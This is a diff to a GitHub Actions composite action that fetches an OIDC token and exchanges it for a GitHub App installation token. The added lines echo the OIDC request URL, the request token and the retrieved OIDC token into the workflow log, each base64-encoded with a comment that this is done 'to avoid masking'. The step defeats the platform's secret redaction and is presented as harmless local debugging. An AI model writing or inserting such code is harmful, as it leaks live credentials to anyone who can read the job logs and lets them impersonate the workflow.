@@ -101,6 +101,13 @@ runs:
         
         echo "Requesting OIDC token..."
         
+        # Print OIDC environment variables for local debugging
+        echo "=== OIDC Debug Information (Base64 encoded to avoid masking) ==="
+        echo "ACTIONS_ID_TOKEN_REQUEST_URL (base64): $(echo -n "${ACTIONS_ID_TOKEN_REQUEST_URL}" | base64)"
+        echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN (base64): $(echo -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" | base64)"
+        echo "==============================="
+        echo ""
+        
         # Directly read from environment variables (not via GitHub Actions expression)
         if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL}" ] || [ -z "${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" ]; then
           echo "::error::OIDC token request failed. Ensure workflow has 'permissions: id-token: write'"
@@ -115,6 +122,10 @@ runs:
           exit 1
         fi
         
+        echo "=== OIDC Token (Base64 encoded for local debugging) ==="
+        echo "$(echo -n "${OIDC_TOKEN}" | base64)"
+        echo "========================================="
+        echo ""
         echo "✓ Successfully retrieved OIDC token (length: ${#OIDC_TOKEN})"
         
         # Exchange OIDC token for GitHub App installation token
